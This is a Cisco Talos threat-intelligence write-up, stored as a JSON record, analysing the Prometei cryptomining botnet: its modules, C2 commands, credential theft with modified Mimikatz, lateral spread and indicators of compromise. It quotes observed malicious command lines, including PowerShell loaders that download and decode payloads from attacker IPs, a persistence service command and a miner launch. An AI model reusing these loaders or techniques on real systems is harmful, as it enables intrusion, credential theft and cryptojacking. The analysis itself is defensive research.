{
    "id": "20d8de92-9136-499c-b644-871863ae69da",
    "created_at": "2023-01-12T15:09:45.364454Z",
    "updated_at": "2025-03-27T02:16:26.198843Z",
    "deleted_at": null,
    "sha1_hash": "f8575e31cb18fd99e921cb2cd96b9aa9fae5b05b",
    "title": "2020-07-22 - Prometei botnet and its quest for Monero",
    "authors": "",
    "file_creation_date": "2022-05-28T21:39:43Z",
    "file_modification_date": "2022-05-28T21:39:43Z",
    "file_size": 1602356,
    "plain_text": "# Prometei botnet and its quest for Monero\n\n**[blog.talosintelligence.com/2020/07/prometei-botnet-and-its-quest-for-monero.html](https://blog.talosintelligence.com/2020/07/prometei-botnet-and-its-quest-for-monero.html)**\n\n_By_ _[Vanja Svajcer.](https://twitter.com/vanjasvajcer)_\n\n## NEWS SUMMARY\n\nWe are used to ransomware attacks and big-game hunting making the headlines, but there are still\nmethods adversaries use to monetize their efforts in less intrusive ways.\n\n\n-----\n\nCisco Talos recently discovered a cryptocurrency-mining botnet attack we re calling Prometei using\nseveral techniques that defenders are likely to spot, but are not immediately obvious to end-users.\n[These threats demonstrate several techniques of the MITRE ATT&CK framework, most notably](https://attack.mitre.org/) [T1089](https://attack.mitre.org/techniques/T1089/)\n(Disabling Security Tools), [T1105 (Remote File Copy),](https://attack.mitre.org/techniques/T1105/) [T1027 (Obfuscated Files or Information), T1086](https://attack.mitre.org/techniques/T1027/)\n[(PowerShell), T1035 (Service Execution),](https://attack.mitre.org/techniques/T1035/) [T1036 (Masquerading) and T1090 (Connection Proxy).](https://attack.mitre.org/techniques/T1036/)\n\nAttackers are constantly reinventing ways of monetizing their tools. Cisco Talos recently discovered a\ncomplex campaign employing a multi-modular botnet with multiple ways to spread and a payload focused on\nproviding financial benefits for the attacker by mining the Monero online currency. The actor employs various\nmethods to spread across the network, like SMB with stolen credentials, psexec, WMI and SMB exploits.\nThe adversary also uses several crafted tools that helps the botnet increase the amount of systems\nparticipating in its Monero-mining pool.\n\n**What's new?**\n\nWe believe this is the first time that anyone's documented Prometei's operations. The actor is actively\nmaintaining all the modules and has been active since March this year.\n\n**How did it work?**\n\nThe infection starts with the main botnet file which is copied from other infected systems by means of SMB,\n[using passwords retrieved by a modified Mimikatz module and exploits such as Eternal Blue. The actor is](https://blog.talosintelligence.com/2017/05/wannacry.html)\n[also aware of the latest SMB vulnerabilities such as SMBGhost, but no evidence of using this exploit has](https://us-cert.cisa.gov/ncas/current-activity/2020/06/05/unpatched-microsoft-systems-vulnerable-cve-2020-0796)\nbeen found.\n\nThe botnet has more than 15 executable modules that all get downloaded and driven by the main module,\nwhich constantly communicates with the command and control (C2) server over HTTP. However, the\nencrypted data is sent using RC4 encryption, and the module shares the key with the C2 using asymmetric\nencryption.\n\nApart from a large focus on spreading across the environment, Prometei also tries to recover administrator\npasswords. The discovered passwords are sent to the C2 and then reused by other modules that attempt to\nverify the validity of the passwords on other systems using SMB and RDP protocols.\n\n**So what?**\n\nDefenders need to be constantly vigilant and monitor the behavior of systems within their network. Attackers\nare like water — they will attempt to find the smallest crack to seep in. While organizations need to be\nfocused on protecting their most valuable assets, they should not ignore threats that are not particularly\ntargeted toward their infrastructure.\n\n## Technical case overview\n\n**Introduction**\n\nThis botnet was discovered by investigating telemetry information coming to Talos from Cisco AMP for\nEndpoints' install base. We regularly conduct hunting sessions to find new malware that may be running\nunder the radar. Rules and command lines are one of the best starting points for hunting.\n\nPowerShell drove the first command line we discovered:\n\n\n-----\n\n```\np ( ( )) {$ $( j\nNet.WebClient).DownloadString('http://69.84.240[.]57:180/miwalk.txt');$data=\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bXOR (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('C:\\windows\\dell\\miwalk.exe',$bt);}\"\n\n```\nFrom then on, we started discovery by traversing the process parent-child graph and coming up to the\nparent module svchost.exe, which was run from an unusual path in the C:\\Windows, rather than\n<Windows\\System32> folder.\n\nA search through the events for the C:\\windows\\svchost.exe and the downloaded IP address brings us to an\neven more interesting call — broken into individual commands for readability:\n```\nC:\\Windows\\System32\\cmd.exe /C taskkill -f -im rdpcIip.exe\ndel C:\\windows\\dell\\rdpcIip.exe\npowershell.exe if(-not (Test-Path 'C:\\windows\\dell\\miwalk.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://69.84.240[.]57:180/miwalk.txt');$data=\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bXOR (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('C:\\windows\\dell\\miwalk.exe',$bt);}\npowershell.exe if(-not (Test-Path 'C:\\windows\\dell\\rdpcIip.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://69.84.240[.]57:180/walker14364.php');$data=\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bXOR (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('C:\\windows\\dell\\rdpcIip.exe',$bt);}\nC:\\Windows\\svchost.exe /sha1chk 58899ed72b617c7e89455d55f5663f44d7eb24d8 C:\\windows\\dell\\miwalk.exe\nC:\\Windows\\svchost.exe /sha1chk e5ffb2a8ceb70e7280fb5ac9f8acac389ed0181e C:\\windows\\dell\\rdpcIip.exe\nC:\\windows\\dell\\rdpcIip.exe ADMINISTRADOR Cohersa2019\n\n```\nImmediately, we see that svchost has multiple functions. Apart from being the parent process of the\nPowerShell invocation that downloads additional components, it is also executed with the /sha1chk option.\nThis indicates that it may also contain integrity checking functionality for downloaded modules.\n\nTwo modules are downloaded and one of them launched rdpcIip,exe — with its file name modified so it looks\nlike the legitimate Windows executable rdpclip.exe. Finally, rdpcIip is launched with two arguments that look\nlike they could be an administrator's user credentials.\n\nOver a period of more than two months, we followed the activity of this botnet and found more than 15\ndifferent modules organized in two main functional branches. Both branches can function fairly\nindependently, which may indicate that we are dealing with another actor piggybacking on the main botnet\nfunctionality and using it to spread their own modules.\n\nThe adversaries developed the first branch in C++ and uses a special type of obfuscation to evade analysis\nand detection in dynamic automated analysis systems. Its main modules — svchost, miwalk, rdpcIip and\nSearchIndexer — are clearly made to work together.\n\n\n-----\n\n_Two main branches of the Prometei (Prometheus) botnet._\n\nHowever, it is more likely we are dealing with the same author, as the second branch is distributed through\nthe same download server and it is downloaded by the main bot svchost.exe. However, the second branch\ndeals mainly with attempting to brute-force the combination of usernames and passwords using SMB and\nRDP protocols and it is developed using .NET framework combined with free tools and modified opensource software.\n\nThe second branch main module nvsync.exe, which communicates with its own C2, contains some\nindication that its purpose is cryptocurrency mining, but we have not found evidence of that.\n\n**Main botnet module branch**\n\nNow, let's look at the main botnet module branch. We'll refer to it as the \"main\" branch because it can\nfunction independently and conducts Monero cryptocurrency mining. This branch contains modules with the\nability to communicate with the C2, spread laterally, steal user credentials and mine Monero. All modules of\nthe main botnet branch are compiled as 64-bit applications, although during our hunting, we also found 32bit variants of the main botnet module.\n\nThe main branch also has auxiliary modules that provide the ability to communicate by proxying\ncommunications over TOR or [I2P networks, collecting information about processes running on the system,](https://geti2p.net/)\nchecks of open ports on target systems and crawling the file systems in search for file names given as the\nargument to the module, typically Bitcoin cryptocurrency wallets.\n\nMain botnet module — Svchost.exe\n\nAlthough the main module is installed in the Windows folder as svchost.exe, it is spread laterally with the\nmodule names \"xsvc.exe\" and \"zsvc.exe\" and are downloaded for updating with PowerShell as up.exe.\n\nMain botnet installation and persistence\n\nAll bot versions are packed with UPX, likely to decrease its size. However, even early versions have another\nlayer of obfuscation, which seems to be a simple XOR obfuscator that decrypts the rest of the code in\nmemory and jumps to the original entry point.\n\n\n-----\n\n_Earlier bot entry-point code with a simple obfuscator._\n\nHowever, later versions of the bot employed a different packer which depends on the existence of an\nexternal file to be properly unpacked. We have found this packer applied to the main bot module and the\nmodified Mimikatz executable miwalk.exe to obtain user credentials from system memory. Svchost.exe, the\nmain bot, checks for the existence of the file \"C:\\Windows\\mscordata.dll.\"\n\n_Custom packer applied to the main bot and Mimikatz modules._\n\nIn addition to making manual analysis more difficult, this anti-analysis technique also avoids detection in\n[dynamic automated analysis systems, such as Cisco Threat Grid. When the execution begins, after UPX](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nunpacking, the execution may take two paths. The first one creates a text file\n\"c:\\windows\\temp\\setup_gitlog.txt\" containing the text \"PaiAuganMai Diag Utility - Setup\" and then pings\nGoogle's DNS server 8.8.8.8 followed by the sysinfo.exe command to save the output of both commands to\nthe file c:\\Windows\\Temp\\sysinfo.txt.\n\nWe found multiple samples that executed this functionality. The detection rate based on this behavior is\nrelatively low.\n\n\n-----\n\nHowever, if the external file exists, it will open and read a single byte, eventually decrypting the main botnet\ncode. Cpuid instruction is also used during the decryption. Initially, this indicated that an anti-VM technique\nmay have been used to avoid execution of the bot in the virtual environment. However, this is not the case,\nand the instruction is only used to retrieve some flags that are used in the decryption process.\n\n_The bot reads a single byte from a file and uses the byte to control execution flow._\n\nSince only a single byte is used, we only have 255 values for the initialization of one of the decryption\nvariables (in 64-bit code it is register r14d) and several strategies on how to approach unpacking, but the\neasiest way is to brute-force the register content. We can do this with an external script or by automating the\n[debugger, which is what we used. We created a simple x64dbg script that allowed us to get to the required](https://x64dbg.com/)\nvalue after a few minutes.\n\n\n-----\n\n```\n$j\nstart:\ninitdbg \"c:\\windows\\zsvc.exe\" //initialize the debugger with the file to be analysed\ncmp $pid,0 //successful initialization?\nje start\nbp 141092418 // set breakpoint to main and continue\nerun // we hit the entry point\nerun // we hit the main function\nbp 14108f441 //if this breakpoint is hit then success!!\nbp 14108f0f9 //if this breakpoint is hit set r14d to the counter $j and increment the counter\nbp 14108f331 //we failed go back to the beginning\nerun //continue\ncmp rip, 14108f0f9 //time to initialise r14d?\njne checkfail //if not have we failed and reached decoy code?\nr14d=$j\nlog {d:r14d} //log the current counter value\n$j = $j + 1\ncmp $j,255\nje end\nerun\ncheckfail:\ncmp rip, 14108f331 //are we in the decoy code, if yes restart debugging\njne checksuccess\ngoto start\nchecksuccess:\ncmp rip,14108f441 //Success!!! We found the value we need. End. \njne start\nend:\npause\n\n```\n_X64dbg script for unpacking the main bot code._\n\nFinally, after some time spent debugging and deobfuscating, we have reached the main bot's deobfuscated\nC++ code and from then on, it is not difficult to find the main function.\n\nIt starts with an attempt to create the folder c:\\windows\\dell and proceeds to attempt to start the service\nUPlugPlay. If the service is successfully started, the bot exists. Otherwise, it assumes it has to install itself\nand set the persistence mechanism.\n\nThe zsvc.exe copies itself into c:\\Windows\\svchost.exe and sets up a service UPlugPlay, which is also\nvisible from the command-line logs. Once the service is set up, it starts and connects to the C2 server.\n```\ncmd.exe /C sc create UPlugPlay binPath= C:\\Windows\\svchost.exe Dcomsvc type=own DisplayName=UPlugand-Play Host start=auto error=ignore\n\n```\n_Creation of UPlugPlay service as seen in the command-line log._\n\nThe communication with the C2 server is conducted over HTTP and is visible although the commands and\n\n\n-----\n\nresults of the commands are transferred using RC4 encryption with a key generated on the client computer\nand stored in the registry values HKLM\\SOFTWARE\\Microsoft\\Fax\\MachineKeyId and\nHKLM\\SOFTWARE\\Microsoft\\Fax\\Encrypted\\MachineKeyId.\n\nThe RC4 key is shared over HTTP as a base64-encoded string in the enckey variable using asymmetric\nencryption using the C2 public key stored in the bot's data section.\n```\nhttp://bk1.bitspiritfun2[.]net/cgi-bin/prometei.cgi?\nadd=b64encodedmachineinfo&h=SERVIDOR&i=1Z2NJQOUX1A3A8CD&enckey=OnIHYtpUUAsq3eQKyeV/AQIKQO4GY0dxCkXtEFYKJB36MtI/YAux37Gk7MbDoyucmnrkC5D5ptZN-t103EFrjm0gbiODeP19McSLiMJEVXNtPgQkXxP6CTAW7-eVRyvLcYoJW-VkvM3sNfgUyEgqBKVDmrmavuZUcEOhs/b8E_\n\n```\nAn example of initial addition of a server to the botnet and its encryption key.\n\nThe HTTP form variable \"add\" contains base64-encoded information about the victim machine, including its\ndomain name, model and processor type. For example:\n```\ninfo {\n  machine name\n  domain.local\n  2x Intel(R) Xeon(R) CPU      3040 @ 1.86GHz\n  4Gb\n  HP\n  ML110 G4\n  ProLiant ML110 G4\n  10.0.14393\n  Serial number\n  20/07/2007\n}\n\n```\n_Machine information info block added to C2 botnet database._\n\nOnce the host is recruited to the botnet, the main bot enters an infinite loop polling commands from the\ncommand and control server. As it is quite common with remote access trojans and bots, there are handlers\nfor usual commands that allow the attacker to control the infected system.\n\nThe bot expects one of the following commands:\n\nrun — Execute a program/file using ShellExecute API\nexec — Execute a program using CreateProcess API\nsrun — Check if the path exists, calculate its SHA1 and execute using CreateProcess\ncmdt — Launch a command shell, redirect stdin and stdout to pipes over HTTP\ncmd — Launch a command shell, redirect stdin and stdout to pipes over HTTP\nscmd — Execute a single command\nver — Get the bot's version\nextip — Get the bot's external IP address\nenc — Get/set the RC4 encryption key\nupdatev3 — Download updated bot to svchost2.exe and start the process then remove the file. If that\nis not successful terminate the process first.\nset timeout — Set period for connecting to C2 server\n\n\n-----\n\nset_cc — Set new C2 server\ntouch — Open file and write a single byte to change checksums and access times\nwget — Download file\nxwget — Download file, save it, then open it and XOR it using single byte XOR with initial key 0x42 and\naddition of 0x42 for each byte\nstop_mining — Terminate the mining process by calling cmd.exe /C taskkill -f -im SearchIndexer.exe. If\nthat did not work, try launching a thread that will call taskkill.\nstart_mining1 — Read C:\\windows\\dell\\Desktop.dat to get parameters and launch SearchIndexer.exe\nstart_mining — Request desktop.txt from the C2, save it to Desktop.dat and launch the miner with\nparameters read from Desktop.dat\nquit — Terminate the bot using TerminateProcess\nquit2 — Exit the command handler loop without calling TerminateProcess\ngetinfo — Get information about the infected system using WMI WQL queries and other methods\n\nCommunication with the C2 server is conducted either directly over HTTP, TOR or I2P proxies. In our\nanalysis, we only managed to find the c:\\windows\\dell\\msdtc.exe file whose main purpose is to proxy\nrequests over [TOR to the C2 server https://gb7ni5rgeexdcncj[.]onion/cgi-bin/prometei.cgi. Another module](https://www.torproject.org/)\nc:\\windows\\dell\\msdtc2.exe may exist which allows the bot to route its requests over an I2P network.\n\nThe main botnet module can function alone as a remote access trojan, but the main purpose of this actor is\nto mine Monero coins and possibly to steal bitcoin wallets potentially protected by passwords stolen with\nMimikatz.\n\nOther modules are available and can be downloaded by the main bot module. The downloads are the initial\nactivity we detected in our telemetry.\n\nDuring our research, we found two main C2 servers: bk1.bitspiritfun2[.]net and p1.feefreepool[.]net. The first\none was active until June 8 when the IP address of the server changed to 75.2.37[.]224, owned by Amazon.\nThe response from the server, \"403 Forbidden,\" may indicate successful takeover of the botnet. The\nprevious two addresses were located in Germany and France.\n\n_DNS query activity for bk1.bitspiritfun2.net as seen by Cisco Umbrella_\n\n[The second server is hosted in Germany on an IP address 88.198.246[.]242 owned by Hetzner.](https://www.hetzner.com/)\n\n\n-----\n\n_DNS query activity for p1.feefreepool.net as seen by Cisco Umbrella._\n\nThe requests for C2 servers come for a fairly wide range of countries, with most requests coming from\nsystems in the United States, Brazil, Turkey, Pakistan, China, Mexico and Chile.\n\nThe downloading server 103.11.244[.]221 is hosted in Hong Kong, while 208.66.132[.]3, 69.28.95[.]50 and\n69.84.240[.]57 is in the U.S.\n\nSpreader (rdpcl1p.exe) and password stealer (miwalk.exe)\n\nThe second most notable module allows the bot to spread laterally over SMB. RdpcIip.exe is coupled with\nmiwalk.exe. The wmain function starts with checking is the credentials file c:\\windows\\dell\\ssldata2.dll exists\nas well as c:\\windows\\dell\\ssldata2_old.dll, which is used to store older credentials.\n\nThe spreader module then changes the registry value:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\nto 1 so the credentials are stored in memory and retrieved using techniques employed by the passwordstealer module.\n\n[The spreader then launches miwalk.exe, a modified version of Mimikatz that steals credentials and stores](https://github.com/gentilkiwi/mimikatz)\nthem in ssldata2.dll. If the credentials are successfully stolen, the spreader will parse the credentials file and\nretrieve the IPv4 address mapping table to extract the IP addresses of the local network interfaces where the\nlocal networks are extracted and saved to the file c:\\windows\\dell\\net.txt.\n\nThe spreader iterates over a network saved in net_<ip_address_of_the_interface>.txt and attempts to\nspread to systems within the networks. This is repeated for every interface. The spreader attempts to\nestablish and authenticate an SMB session using stolen credentials or the guest account without a password\nand copy the main bot module as xsvc.exe or zsvc.exe to the target system.\n\nIf the main bot module is successfully copied, the spreader will either use psexec or WMI to remotely launch\nthe copied module.\n\nIf the attempt with stolen credentials are not successful, the spreader will attempt to launch a variant of the\nEternal Blue exploit, depending on the remote operating system version, and send the shellcode to install\nand launch the main bot module.\n\nMonero mining payload (XMRig)\n\nThe final payload of the main functional branch is a sample of the open source Monero mining software\nXMRig version 5.5.3. The miner is located in the folder c:\\windows\\dell with the name SearchIndexer.exe.\nThe XMRig payload is downloaded by the main bot module.\n\n\n-----\n\n```\n       y p\nif(-not (Test-Path 'C:\\windows\\dell\\Desktop.dat')) {\n(New-Object Net.WebClient).DownloadFile('http://208.66.132[.]3:8080/Desktop.txt',\n'C:\\Windows\\dell\\Desktop.dat');\n}\nif(-not (Test-Path 'C:\\windows\\dell\\WinRing0x64.sys')) {\n$b64 = $(New-Object Net.WebClient).DownloadString('http://208.66.132[.]3:8080/dllr0.php');\n$data = [System.Convert]::FromBase64String($b64);\n$bt = New-Object Byte[]($data.Length);\n  FOR ([int]$ i = 0; $i -lt $data.Length; $i++){\n  $bt[$i] = ((($data[$i]+0xFE) -band 0xFF) -bXOR 255);\n  }\n[io.file]::WriteAllBytes('C:\\windows\\dell\\WinRing0x64.sys',$bt);\n}\nif(-not (Test-Path 'C:\\windows\\dell\\SearchIndexer.exe')) {\n$b64=$(New-Object Net.WebClient).DownloadString('http://208.66.132[.]3:8080/srchindx2.php');\n$data=[System.Convert]::FromBase64String($b64);\n$bt=New-Object Byte[]($data.Length);\n[int]$j=0;\n   FOR([int]$i=0;$i -lt $data.Length; $i++){\n   $j+=66;$bt[$i]=(((($data[$i]) -bXOR (($i*3) -band 0xFF))-$j) -band 0xFF);\n  }\n[io.file]::WriteAllBytes('C:\\windows\\dell\\SearchIndexer.exe',$bt);\n}\ntaskkill -f -im taskmgr.exe\nC:\\Windows\\svchost.exe /sha1chk fcd80a03388f0f73a8718d18291590b77ac10dd2\nC:\\windows\\dell\\SearchIndexer.exe\n\n```\n_The command line to download and check the integrity of XMRig miner as visible in the log._\n\nThe miner is first packed with UPX and then with a relatively simple XOR packer that adds a new PE section\n— .ucode — to the executable. This is similar to the packer in earlier versions of the main bot module.\n\nThe miner is called by the main bot module svchost.exe when the C2 issues the command start_mining.\nSvchost gets the command-line parameters such as the mining server, the miner username, password and\nthe protocol used for mining from the C2. The launch of the miner is visible in the command-line log of the\ninfected systems.\n```\nC:\\windows\\dell\\SearchIndexer.exe -o stratum+tcp://srv1.feefreepool[.]net:80 -u\n4A1txQ9L8h8NqF4EtGsZDP5vRN3yTVKynbkyP1jvCiDajNLPepPbBdrbaqBu8fCTcFEFdCtgbeSsTf17B1MhyE2AKCEyfR -p x\n--donate-level 1\n\n```\nIf we search for this particular account on Monerohash.com, we get to the result that shows this botnet\nconsistently achieving between 700KH/sec and 950KH/sec, which implies the amount of infected systems is\nin the low thousands. The earning potential of the botnet is relatively small and during its four-month run, it\nearned its owner just under $5,000 USD, or $1,250 per month, on average.\n\n\n-----\n\n_Earnings of the Monero mining botnet on July 8, 2020._\n\n[This is consistent with the indications of the Monero mining calculator available on Cryptocompare.com.](https://www.cryptocompare.com/)\n\n_Monero crypto mining calculator which shows the earning potential of the botnet._\n\nAlthough earnings of $1,250 per month doesn't sound like a significant amount compared to some other\ncyber criminal operations, for a single developer in Eastern Europe, this provides more than the average\nmonthly salary for many countries.\n\nPerhaps that is why, if we look at the embedded paths to program database files in many botnet\ncomponents, we see a reference to the folder c:\\Work.\n```\nC:\\Work\\Tools_2019\\misc\\tor_hidden_svc\\darkread\\x64\\Release\\darkread.pdb\nC:\\Work\\Tools_2019\\prometei\\RDPBrute2016.NET\\RDPDetect\\bin\\Release\\CryptoObfuscator_Output\\nvsync.pdb\nC:\\Work\\Tools_2019\\prometei\\nvstub\\Release\\nvstub.pdb\nC:\\Work\\Tools_2019\\prometei\\psbrute\\Release\\psbrute.pdb\nC:\\Work\\Tools_2019\\walker\\netwalker\\x64\\Release\\rdpcIip.pdb\nC:\\Work\\Tools_2019\\misc\\util\\chk445\\Release\\chk445.pdb\nC:\\Work\\Tools_2019\\misc\\util\\crawler\\Release\\crawler.pdb\n\n```\n\n-----\n\nOther auxiliary modules\n\nApart from the main four modules, the botnet also contains 7multiple auxiliary modules that get downloaded\nand run on a command from the C2 server.\n\nCrawler.exe is a simple file system crawler which searches the local file system for filenames specified as\nthe parameter. We have observed low activity of the module and its usage indicates the intention of the actor\nto find Bitcoin wallets on infected systems.\n\nChk445.exe is a simple tool that checks if port 445 is opened on the targeted system. Ztasklist.exe is a tool\nthat enumerates all the running processes and\n\nModules smcard.exe and msdtc.exe are tasked with communicating with C2 servers over TOR. Smcard.exe\nis the TOR relay that connects the infected system to the TOR network and starts a socks proxy on localhost\nport 9050. Msdtc.exe is a proxy client which is driven by the main bot module. Its command line parameter is\nsimply Base64-encoded URL and the request to the gb7ni5rgeexdcncj.onion C2 server and this request will\nbe routed through the TOR network.\n\n**Nvstub branch**\n\nThe second botnet branch, which we're calling \"Nvstub,\" has its own functionality and a different C2.\n\nSvchost first attempts to delete several files and then download executables required to download a 7-Zip\narchive that contains all components of the Nvstub branch. The 7-Zip archive is extracted by a previously\ndownloaded 7z.exe utility. The Nvstub archive, _agent.7z, is password-protected with the password\n\"horhor123\". Once the agent is extracted in C:\\Windows\\dell folder, the main botnet module launches\nnvstub.exe, the first module of the second branch, with the single command line parameter that contains the\nIP address of the C2 and its password.\n\n\n-----\n\n```\n       y\ndel C:\\Windows\\dell\\_agent.7z\ntaskkill -f -im nvsync.exe\ndel C:\\windows\\dell\\nvsync.exe\ndel C:\\windows\\dell\\ps.exe\ntaskkill -f -im socks.exe\ndel C:\\windows\\dell\\socks.exe\ndel C:\\windows\\dell\\nvsync2.exe\ndel C:\\windows\\dell\\nvsync4.exe\ndel C:\\windows\\dell\\winpr2.dll\ndel C:\\windows\\dell\\freerdp2.dll\ndel C:\\windows\\dell\\freerdp-client2.dll\ndel C:\\windows\\dell\\nvstub.exe\ndel C:\\Windows\\dell\\_agent.7z\npowershell.exe if(-not (Test-Path 'C:\\windows\\dell\\7z.dll')) {(New-Object\nNet.WebClient).DownloadFile('http://208.66.132[.]3:8080/7z.dll', 'C:\\Windows\\dell\\7z.dll');} if(-not\n(Test-Path 'C:\\windows\\dell\\7z.exe')) {(New-Object\nNet.WebClient).DownloadFile('http://208.66.132[.]3:8080/7z.exe', 'C:\\Windows\\dell\\7z.exe');} (NewObject Net.WebClient).DownloadFile('http://208.66.132[.]3:8080/_agent.7z',\n'C:\\Windows\\dell\\_agent.7z');\nC:\\Windows\\svchost.exe /sha1chk 48bcecd5d3f293cdc8356aee5ec4bab3252493fb C:\\windows\\dell\\7z.exe\nC:\\Windows\\svchost.exe /sha1chk 98a5ee5d689d664a14bb9a680c6e4fec5e752842 C:\\windows\\dell\\7z.dll\nC:\\Windows\\svchost.exe /sha1chk c42ab26ad284d52aefa2d40b7f4bf9a95109a5ff C:\\windows\\dell\\_agent.7z\nC:\\windows\\dell\\7z x C:\\Windows\\dell\\_agent.7z -phorhor123 -oC:\\Windows\\dell -y\ndel C:\\Windows\\dell\\_agent.7z\ndel C:\\windows\\dell\\SearchIndexer.exe\nC:\\Windows\\dell\\nvstub.exe 211.23.16[.]239/prometheus.php_x1\n\n```\n_Installation and launch of the Nvstub branch as seen from the command line log._\n\nNvstub.exe is a simple module that sets up the environment for other modules — the most significant being\nthe second bot, nvsync.exe. The _agent.7z archive contains the nvsync2.exe and nvsync4.exe variants of\nthe bot. Nvstub.exe first checks the version of .NET framework installed on the system, attempts to terminate\nthree main branch modules — nvsync.exe, ps.exe and socks.exe — and, finally, copies the appropriate\nversion of nvsync into nvsync.exe and launches it with the arguments forwarded from its own arguments.\n\n\n-----\n\n_Nvstub is the first module that sets the environment for other modules._\nNvsync\n\nWhile most of the other botnet modules as written in C or C++, here, the actor displays the shift in the\nprogramming environment and chooses the .NET framework and C# for the main bot module of the Nvstub\nbranch. The actor applies obfuscation to the module using CryptoObfuscator protector, but that is easily\n[addressed using de4dot.](https://github.com/0xd4d/de4dot)\n\n_Part of the deobfuscated nvsync.exe code with renamed functions to describe functionality._\n\nWhen started, the nvsync.exe module will parse its command line arguments and either initialize the bot and\n\n\n-----\n\nconnect with the C2 or create an array of processes — the number of which depends on the computing\npower of the infected system. Each process will launch another instance of nvsync.exe which will, based on\nits parameters, check the validity of credentials for a list of IP addresses supplied by the C2 server using\neither SMB or RDP clients.\n\nWe observed only one C2 URL for the Nvstub branch: https://211.23.16[.]239/prometheus.php, hosted in\nTaiwan.\n\nThe parameters for child processes are first encrypted with RC4 and then encoded using Base64. The RC4\npassphrase \"param error user,\" used for encrypting parameters for child processes is decrypted from a\nhardcoded Base64 encoded string \"T9FLs3QS45JuVnTAljDz4Q==\" and the initial passphrase \"Data param\nerror.\"\n\nFrom then on, this encryption is likely used to evade suspicious invocation of the child processes that\ncontain IP addresses, domain names, usernames and passwords.\n\n_[RC4 decryption of a password parameter using a CyberChef instance.](https://gchq.github.io/CyberChef/)_\n\nApart from the main nvsync.exe module, there are two additional important modules that are integral for the\ncorrect function of the botnet: ps.exe and socks.exe. They are both 32-bit applications.\n\nBefore calling any of the credential's validation modules, nvsync.exe filters credentials to avoid certain\ntargets.\n\nThese include:\n\n…\nIME_ADMIN\nIME USER\n\n\n-----\n\nPlesk Administrator\nSvcCOPSSH\nWDeployAdmin\nGuest\nГость\nftpuser\nFTP User\nAltro utente\nOther User\nДругой пользователь\n\nThe validation will also not be attempted if the supplied credentials contain one of the following strings:\n\nworkgroup\nmshome\nwin\nmicrosoft\nuser\nadmin\nadministrator\npc\ncom\nbuh\nlocal\nhome\ncorp\noffice\nlan\nbiz\nnet\norg\nloc\nru\nua\ntr\nserver\nserv\nsrv\n\nPs.exe\n\n[The first module attempts to log onto TCP port 445 using the NTLM authentication protocol. Every](http://davenport.sourceforge.net/ntlm.html)\nsuccessful connection confirms the validity of credentials for the target IP address and the credentials are\nconfirmed with C2 server by nvsync.exe module.\n\n\n-----\n\n_Packet capture showing attempts to connect and validate supplied credentials._\n\nThere are some similarities in the code of ps.exe and rdpcIip.exe, mostly around low-level SMB\ncommunication and authentication with the NTLM Security Support Provider.\nSocks.exe\n\nSocks.exe RDP communication capabilities depend on the open-source and free RDP client libraries\nfreerdp2.dll and freerdp-client.dll. The application first processes the parameters, which include the IP\naddress and the port of the host, as well as the main part of the filename, without the extension, containing\ncredentials to be attempted for logging into the target system. The supplied name of the file is generated by\nbase64-encoding the RC4-encrypted combination of the ip_address:port of the target.\n\nSocks.exe parses a file with the extension \".cpass\" containing candidate passwords and attempts to log into\nan RDP server using the combination of the domain supplied as a command-line argument and\nadministrator's username. Each successful combination of credentials will be saved in the file name with the\nsame base name and the extension .cpass_good.\n\nOnce socks.exe terminates and returns to nvsync.exe, nvsync reads all validated credentials and submits\nthem to the command and control server.\n\nAuxiliary modules for the Nvstub branch\n\nThe second branch auxiliary modules are all legitimate executables or libraries that support the operation of\nthe branch. 7z.exe is the 7-Zip unarchiver used to extract files from the _agent.7z archive that contains all\nmodules of the Nvstub branch. Zlib.dll is a 7z.exe dependency. Two of the FreeRDP DLLs — freerdp2.dll\nand freerdp-client2.dll — are required for successful RDP communications but can also be found as a part of\na legitimate FreeRDP installation.\n\n## Conclusion\n\nDespite their activities being visible in logs, some botnets successfully fly under detection teams' radar,\npossibly due to their small size or constant development on the adversary's part. Prometei is just one of\nthese types of networks that focuses on Monero mining. It has been successful in keeping its computing\npower constant over the three months we've been tracking it.\n\nThe botnet was active as early as the beginning of March, but it seems to have been dealt a blow by a\ntakeover of one of its C2 servers on June 8. But this takeover didn't stop its mining capabilities or the\nvalidation of stolen credentials. The botnet continues to make a moderate profit for a single developer, most\nlikely based in Eastern Europe.\n\nThe actor behind it is also likely its developer. The TTPs indicate we may be dealing with a professional\ndeveloper, based on their ability to integrate SMB exploits such as Eternal Blue and authentication code and\nthe use of existing open-source projects, such as Mimikatz and FreeRDP.\n\nApart from stealing computing power, the botnets behaviour of stealing and validating credentials is\nworrying. Although we only saw evidence of stolen credentials being used to spread laterally, they also have\na value on underground markets and the damage potential of losing important administrative username and\npassword is very high. This is why organizations that detect the presence of Prometei botnet on their system\nshould act immediately to remove it and to make sure none of their credentials are leaked to the command\nand control server.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below\n\n\n-----\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nthreat actors. Exploit Prevention present within AMP is designed to protect customers from unknown attacks\nsuch as this automatically.\n\n[Cisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\nmalicious websites and detects malware used in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such as Next-Generation Firewall 